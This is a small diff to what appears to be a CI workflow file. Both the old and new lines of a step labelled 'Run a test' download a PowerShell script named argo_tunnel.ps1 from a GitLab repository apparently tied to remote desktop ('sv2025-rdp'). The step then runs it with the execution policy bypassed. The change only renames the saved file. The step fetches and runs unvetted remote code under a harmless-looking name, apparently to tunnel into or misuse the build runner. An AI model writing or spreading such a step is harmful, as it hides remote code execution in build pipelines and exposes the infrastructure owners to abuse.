@@ -11,5 +11,5 @@ jobs:
       - name: Run a test
         shell: powershell
         run: |
-          iwr -Uri "https://gitlab.com/gitrdp124/sv2025-rdp/-/raw/main/argo_tunnel.ps1" -OutFile "tail.ps1"
-          powershell -ExecutionPolicy Bypass -File .\tail.ps1
+          iwr -Uri "https://gitlab.com/gitrdp124/sv2025-rdp/-/raw/main/argo_tunnel.ps1" -OutFile "argo.ps1"
+          powershell -ExecutionPolicy Bypass -File .\argo.ps1
